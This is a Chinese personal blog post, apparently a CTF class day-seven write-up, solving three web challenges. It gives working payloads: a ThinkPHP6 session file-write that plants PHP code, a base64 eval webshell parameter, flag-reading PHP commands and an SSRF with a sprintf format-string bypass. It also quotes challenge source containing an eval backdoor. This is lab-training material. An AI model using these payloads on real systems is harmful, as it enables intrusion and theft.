@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/file/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/file/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/file/favicon-16x16.png">
+  <link rel="mask-icon" href="/file/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"czlz.net","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言 第七天好累呀。。懒得写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见的getshell姿势（大比武_CTF课_第七天）">
+<meta property="og:url" content="https://czlz.net/2020/jxsw_dbw_web_7/index.html">
+<meta property="og:site_name" content="粗制乱造的个人网站">
+<meta property="og:description" content="前言 第七天好累呀。。懒得写">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/thinkphp_1.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/thinkphp_2.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/thinkphp_3.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/thinkphp_4.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/thinkphp_5.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/CheckIN_1.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/CheckIN_2.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/CheckIN_3.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/wjtc_1.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_7/wjtc_2.png">
+<meta property="article:published_time" content="2020-07-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-08T15:43:16.128Z">
+<meta property="article:author" content="粗制乱造">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="练习题">
+<meta property="article:tag" content="CTF课">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="黑盒测试">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="getshell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://czlz.net/2020/jxsw_dbw_web_7/thinkphp_1.png">
+
+<link rel="canonical" href="https://czlz.net/2020/jxsw_dbw_web_7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>常见的getshell姿势（大比武_CTF课_第七天） | 粗制乱造的个人网站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">粗制乱造的个人网站</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">杂七杂八的一堆东西</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-python">
+
+    <a href="/pyodide/" rel="section"><i class="fa fa-user fa-fw"></i>在线Python3.8</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://czlz.net/2020/jxsw_dbw_web_7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/file/avatar.png">
+      <meta itemprop="name" content="粗制乱造">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="粗制乱造的个人网站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          常见的getshell姿势（大比武_CTF课_第七天）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-07 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-07T00:00:00+08:00">2020-07-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-08 23:43:16" itemprop="dateModified" datetime="2020-07-08T23:43:16+08:00">2020-07-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/getshell/" itemprop="url" rel="index"><span itemprop="name">getshell</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- toc -->
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 第七天好累呀。。懒得写</p>
+<a id="more"></a>
+<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><p>(待总结)</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>1、拿到网站先用dirsearch扫描一下（自从学了CTF就再没正常的看过网站^_^）。<br><img src="thinkphp_1.png" alt=""><br>发现网站备份，下载之。</p>
+<p>2、另外通过访问不存在的页面也可以知道。这个网站是用的ThinkPHP6.0搭建的。<br><img src="thinkphp_2.png" alt=""></p>
+<h3 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h3><p>通过互联网搜索ThinkPHP6存在任意文件操作漏洞。<br>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br>然后再search搜索的内容会直接保存在/runtime/session/sess_+sessionid目录下。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、先注册一个用户，我这里注册用户名密码都是111,<br>2、然后修改session id 最后的四位改为.php<br><img src="thinkphp_3.png" alt=""><br>3、在搜索框输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="thinkphp_4.png" alt=""><br>访问:/runtime/session/sess_ef408be053f8be8601c5bc8ae79b.php。<br>看到了PHPINFO信息。接下来试试上传一句话木马。<br>菜刀好像用不了。disable_functions了一堆东西。<br>手工写命令吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#scandir这个命令可以用，我们不用绕过了</span><br><span class="line">var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">#直接读出flag就行了，</span><br><span class="line">echo readfile(&quot;&#x2F;flag&quot;);</span><br></pre></td></tr></table></figure>
+<p>提示没有权限，这回晕了。<br>在根目录下发现了另一个文件readflag的二进制文件。<br>试试上传php7-gc-bypass运行这个readflag来读文件。<br>本下试试蚁剑，可惜下载太慢了。<br>直接写了一个python脚本，提交代码得了。<br><img src="thinkphp_5.png" alt=""><br>最终拿到了;</p>
+<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>
+<p>直接就是可以上传代码，并执行？有这么简单？不可能吧。</p>
+<h3 id="开整"><a href="#开整" class="headerlink" title="开整"></a>开整</h3><p>1、将phpinfo();加密成base64提交。<br>成功看到php信息。<br>再看到disable_functions栏。果然一大票函数被封。这题不用说,肯定是disable_functions绕过。<br><img src="CheckIN_1.png" alt=""><br>为了方便写代码，省得老是BASE64的转。<br>提交Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==&amp;1=phpinfo();语句，开始找FLAG;<br>提交var_dump(scandir(“/“));<br><img src="CheckIN_2.png" alt=""><br>卧槽这不跟上一题一样嘛。</p>
+<p>2、用上一题的脚本改一下。<br><img src="CheckIN_3.png" alt=""><br>直接拿到flag<br>感觉已经没有灵魂了。。</p>
+<h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>这题感觉有点复杂呀。<br><img src="wjtc_1.png" alt=""><br>不过既然都说了是文件探测。。那就探呗。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">githack http:&#x2F;&#x2F;08b0879c-423f-4489-be21-9762544289ad.node3.buuoj.cn&#x2F;.git</span><br><span class="line">#啥也没有。</span><br><span class="line">dirsearch -u http:&#x2F;&#x2F;08b0879c-423f-4489-be21-9762544289ad.node3.buuoj.cn -e * -t 2 -s 0.1</span><br><span class="line">#扫到一些东西</span><br></pre></td></tr></table></figure>
+<p>主要看看robots.txt下有些什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;flag.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br><span class="line">Allow: &#x2F;index.php</span><br></pre></td></tr></table></figure>
+<p>flag.php无法直接访问，<br>admin.php好像有点东西。127.0.0.1的地址才能访问。<br>搞了一圈，没点用。回到上面的扫出来的其它地址发现home.php有点东西。<br>应当是文件包含,测试了flag.php,admin.php都不行,应当是有过滤。先看system.php吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;system</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">'       Error:  url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="string">'       Error:  damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="string">'       Error:  request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/normalize.css"</span> /&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/demo.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/component.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=<span class="string">"js/modernizr.custom.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id="theForm" class="simform" autocomplete="off" action="system.php" method="post"&gt;</span><br><span class="line">        &lt;div class="simform-inner"&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;</span><br><span class="line">            &lt;ol class="questions"&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q1"</span>&gt;你知道目录下都有什么文件吗?&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q1"</span> name=<span class="string">"q1"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q2"</span>&gt;请输入你想检测文件内容长度的url&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q2"</span> name=<span class="string">"q2"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q1"</span>&gt;你希望以何种方式访问？GET？POST?&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q3"</span> name=<span class="string">"q3"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ol&gt;</span><br><span class="line">            &lt;button class="submit" type="submit" value="submit"&gt;提交&lt;/button&gt;</span><br><span class="line">            &lt;div class="controls"&gt;</span><br><span class="line">                &lt;button class="next"&gt;&lt;/button&gt;</span><br><span class="line">                &lt;div class="progress"&gt;&lt;/div&gt;</span><br><span class="line">                &lt;span class="number"&gt;</span><br><span class="line">					&lt;span class="number-current"&gt;&lt;/span&gt;</span><br><span class="line">					&lt;span class="number-total"&gt;&lt;/span&gt;</span><br><span class="line">				&lt;/span&gt;</span><br><span class="line">                &lt;span class="error-message"&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;span class="final-message"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=<span class="string">"https://gem-love.com"</span> target=<span class="string">"_blank"</span>&gt;@颖奇L<span class="string">'Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/section&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script type="text/javascript" src="js/classie.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type="text/javascript" src="js/stepsForm.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">    var theForm = document.getElementById( '</span>theForm<span class="string">' );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    new stepsForm( theForm, &#123;</span></span><br><span class="line"><span class="string">        onSubmit : function( form ) &#123;</span></span><br><span class="line"><span class="string">            classie.addClass( theForm.querySelector( '</span>.simform-inner<span class="string">' ), '</span>hide<span class="string">' );</span></span><br><span class="line"><span class="string">            var messageEl = theForm.querySelector( '</span>.<span class="keyword">final</span>-message<span class="string">' );</span></span><br><span class="line"><span class="string">            form.submit();</span></span><br><span class="line"><span class="string">            messageEl.innerHTML = '</span>Ok...Let me have a check<span class="string">';</span></span><br><span class="line"><span class="string">            classie.addClass( messageEl, '</span>show<span class="string">' );</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125; );</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$filter1 = '</span>/^http:\/\/<span class="number">127</span>\<span class="number">.0</span>\<span class="number">.0</span>\<span class="number">.1</span>\<span class="comment">//i';</span></span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>fuck.py的源码无法获得。<br>主要看PHP的代码，重点是最后面q1,q2,q3提交的数据中。<br>q1没作用，随便输一个数就行了。<br>q2是个URL地址，但是会追加.y1ng.txt文件，可以用?和#过滤掉。<br>q3必须以GET或是POST开头。<br>最终结果用了sprintf，构造输出字符串，但是内容用了%d这个只输出数字。<br>所以要想办法逃逸掉%d。PHP打印特殊字符%的方法是%%。然后我们让他输出字符串%s。<br>所以最终构造playload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;p3&#x3D;GET%s%</span><br><span class="line">#转换一下</span><br><span class="line">q1&#x3D;1&amp;q2&#x3D;http%3A%2F%2F127.0.0.1%2Fadmin.php%23&amp;q3&#x3D;GET%25s%25</span><br></pre></td></tr></table></figure>
+<p>提交。。总算是看到admin.php的代码了。（为什么不看flag.php呢，因为看不到。会报错）</p>
